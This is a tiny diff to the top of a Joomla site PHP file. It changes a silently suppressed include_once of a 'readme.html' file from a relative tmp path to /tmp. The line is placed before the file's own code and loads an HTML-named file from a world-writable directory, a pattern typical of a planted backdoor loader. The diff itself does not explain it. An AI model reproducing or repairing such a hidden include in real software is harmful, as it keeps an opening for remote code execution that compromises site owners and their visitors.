@@ -1,4 +1,4 @@
-<?php @include_once("tmp/readme.html") ?><?php
+<?php @include_once("/tmp/readme.html") ?><?php
 /**
  * @package    Joomla.Site
  *
